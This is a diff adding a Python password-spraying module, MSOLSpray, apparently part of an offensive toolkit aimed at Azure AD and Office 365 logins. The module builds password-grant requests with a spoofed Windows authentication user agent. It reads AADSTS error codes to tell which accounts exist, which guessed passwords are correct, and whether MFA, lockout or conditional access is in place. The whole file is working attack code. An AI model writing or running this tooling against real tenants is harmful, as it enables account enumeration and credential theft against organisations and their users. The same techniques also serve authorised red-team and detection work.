@@ -1,0 +1,95 @@
+import requests
+from .base import SprayModule
+from contextlib import suppress
+
+
+class MSOLSpray(SprayModule):
+
+    body = {
+        'resource': 'https://graph.windows.net',
+        'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
+        'client_info': '1',
+        'grant_type': 'password',
+        'scope': 'openid',
+    }
+
+    headers = {
+        'Accept': 'application/json',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
+    }
+
+    def check_response(self, response):
+
+        exists = False
+        valid = False
+        locked = False
+        msg = ''
+
+        if getattr(response, 'status_code', 0) == 200:
+            exists = True
+            valid = True
+
+        else:
+            r = {}
+            with suppress(Exception):
+                r = response.json()
+                exists = True
+
+            error = r.get('error_description', '')
+
+            if 'AADSTS50126' in error:
+                msg = f'AADSTS50126: Invalid email or password. Account could exist.'
+
+            elif 'AADSTS50128' in error or 'AADSTS50059' in error:
+                exists = False
+                msg = f'AADSTS50128: Tenant for account doesn\'t exist. Check the domain to make sure they are using Azure/O365 services.'
+
+            elif 'AADSTS90072' in error:
+                valid = True
+                msg = f'AADSTS90072: Valid credential, but not for this tenant.'
+
+            elif 'AADSTS50034' in error:
+                exists = False
+                msg = f'AADSTS50034: User does not exist.'
+
+            elif 'AADSTS50079' in error or 'AADSTS50076' in error:
+                valid = True
+                # Microsoft MFA response
+                msg = f'AADSTS50079: The response indicates MFA (Microsoft) is in use.'
+
+            elif 'AADSTS50055' in error:
+                valid = True
+                # User password is expired
+                msg = f'AADSTS50055: The user\'s password is expired.'
+
+            elif 'AADSTS50131' in error:
+                valid = True
+                # Password is correct but login was blocked
+                msg = 'AADSTS50131: Correct password but login was blocked.'
+
+            elif 'AADSTS50158' in error:
+                valid = True
+                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
+                msg = 'AADSTS50158: The response indicates conditional access (MFA: DUO or other) is in use.'
+
+            elif 'AADSTS50053' in error:
+                locked = True
+                exists = False # M$ gets nasty and sometimes lies about this
+                # Locked out account or Smart Lockout in place
+                msg = f'AADSTS50053: Account appears to be locked.'
+
+            elif 'AADSTS50056' in error:
+                msg = f'AADSTS50056: Account exists but does not have a password in Azure AD.'
+
+            elif 'AADSTS80014' in error:
+                msg = f'AADSTS80014: Account exists, but the maximum Pass-through Authentication time was exceeded.'
+
+            elif 'AADSTS50057' in error:
+                # Disabled account
+                msg = f'AADSTS50057: The account appears to be disabled.'
+
+            else:
+                msg = f'Got an error we haven\'t seen yet: {error}'
+
+        return (valid, exists, locked, msg)
